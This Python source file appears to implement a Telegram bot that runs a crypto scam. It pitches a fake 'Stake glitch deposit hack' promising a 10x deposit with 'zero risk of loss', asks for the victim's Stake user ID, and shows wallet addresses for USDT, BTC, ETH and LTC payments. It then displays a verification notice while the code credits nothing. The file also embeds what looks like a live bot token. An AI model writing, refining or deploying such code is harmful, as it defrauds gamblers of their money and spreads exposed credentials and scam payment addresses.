from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
)

BOT_TOKEN = '7842485228:AAFb3cDj8RTkR26Vkd5ZZ927ePQPs2g49D4'

# Addresses for each currency
ADDRESSES = {
    'USDT': 'TMdVD5hbUu511MX3MBnAdnnXS1fSFwSwvV',
    'BTC': '121Yjh2kz27GvQeLpEjDNWo8qP5WAdzy3Z',
    'ETH': '0xc214964fe35e2e8b245686ecc8ea72d5efc221cd',
    'LTC': '0xc214964fe35e2e8b245686ecc8ea72d5efc221cd',
}

# Image URLs from your GitHub repo (raw links)
IMAGES = {
    'USDT': 'https://raw.githubusercontent.com/encrypted69-code/stake/main/usdt.jpg',
    'BTC': 'https://raw.githubusercontent.com/encrypted69-code/stake/main/btc.jpg',
    'ETH': 'https://raw.githubusercontent.com/encrypted69-code/stake/main/eth.jpg',
    'LTC': 'https://raw.githubusercontent.com/encrypted69-code/stake/main/ltc.jpg',
}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name
    text = f'HII "{user_name}" ARE YOU READY FOR STAKE 10X DEPOSIT? IF YES THEN CONTINUE'
    keyboard = [[InlineKeyboardButton("CONTINUE", callback_data="CONTINUE")]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data.upper()

    if data == "CONTINUE":
        text = "DO YOU WANT TO MAKE A DEPOSIT?"
        keyboard = [
            [InlineKeyboardButton("YES", callback_data="DEPOSIT_YES"),
             InlineKeyboardButton("NO", callback_data="DEPOSIT_NO")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "DEPOSIT_YES":
        text = (
            "🎰 STAKE GLITCH DEPOSIT HACK (ONE-TIME USE)\n"
            "WE’VE DISCOVERED A GLITCH WITH STAKE BONUS DEPOSIT CODES — AND HERE’S HOW IT WORKS:\n\n"
            "💎 WHAT IT DOES\n"
            "WE SCRAPE AND APPLY SPECIAL BONUS DEPOSIT CODES THAT MULTIPLY YOUR DEPOSIT 10X INSTANTLY.\n\n"
            "⚠️ THIS ONLY WORKS ONCE PER ACCOUNT ID.\n\n"
            "🧠 IMPORTANT NOTE\n"
            "YOU CAN’T WITHDRAW THE FUNDS IMMEDIATELY.\n"
            "THE BONUS BEHAVES LIKE REGULAR STAKE BONUSES — YOU MUST WAGER THE FULL AMOUNT BEFORE WITHDRAWING.\n\n"
            "💰 WHAT’S IN IT FOR YOU?\n"
            "I’LL PROVIDE YOU WITH A STEP-BY-STEP STRATEGY TO PLAY SAFELY, WAGER THE REQUIRED AMOUNT, AND WITHDRAW THE FULL BALANCE — WITH ZERO RISK OF LOSS IF DONE RIGHT."
        )
        keyboard = [[InlineKeyboardButton("DEPOSIT", callback_data="DEPOSIT")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "DEPOSIT":
        await query.edit_message_text("PLEASE ENTER YOUR STAKE USER ID:")
        context.user_data['awaiting_user_id'] = True

    elif data == "CONFIRM_USER_ID":
        # Show currency options after user confirms ID
        keyboard = [
            [
                InlineKeyboardButton("USDT", callback_data="CURRENCY_USDT"),
                InlineKeyboardButton("BTC", callback_data="CURRENCY_BTC")
            ],
            [
                InlineKeyboardButton("ETH", callback_data="CURRENCY_ETH"),
                InlineKeyboardButton("LTC", callback_data="CURRENCY_LTC")
            ]
        ]
        await query.edit_message_text("PLEASE SELECT YOUR PAYMENT CURRENCY:", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data.startswith("CURRENCY_"):
        currency = data.split("_")[1]
        image_url = IMAGES.get(currency)
        address = ADDRESSES.get(currency)

        if image_url and address:
            # Send photo from URL
            await query.message.reply_photo(photo=image_url)
            # Send address as a copyable message
            await query.message.reply_text(f"{address}")
            # Send confirm payment button
            keyboard = [[InlineKeyboardButton("CONFIRM PAYMENT", callback_data="CONFIRM_PAYMENT")]]
            await query.message.reply_text("Click the button below after you have made the payment.", reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await query.message.reply_text("⚠️ ERROR: Currency data not found.")

    elif data == "CONFIRM_PAYMENT":
        text = (
            "🕒 PAYMENT VERIFICATION NOTICE\n\n"
            "YOUR PAYMENT WILL BE VERIFIED WITHIN 10–15 MINUTES.\n\n"
            "✅ ONCE VERIFIED, YOUR STAKE ID WILL BE CREDITED WITHIN 5 MINUTES.\n"
            "IF YOU STILL DON’T SEE THE FUNDS ADDED, PLEASE CONTACT THE ADMIN — WE'RE HERE TO HELP!"
        )
        await query.edit_message_text(text)

    elif data == "DEPOSIT_NO":
        await query.edit_message_text("OK, IF YOU CHANGE YOUR MIND, JUST TYPE /START TO BEGIN AGAIN.")

async def handle_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_user_id'):
        user_id = update.message.text.strip()
        context.user_data['stake_user_id'] = user_id
        context.user_data['awaiting_user_id'] = False

        # Send confirmation button instead of asking for text confirmation
        keyboard = [[InlineKeyboardButton("CONFIRM", callback_data="CONFIRM_USER_ID")]]
        await update.message.reply_text(
            f"YOUR STAKE USER ID IS: {user_id}\n\nCLICK CONFIRM TO PROCEED.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_buttons))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_user_id))
    app.run_polling()

if __name__ == "__main__":
    main()
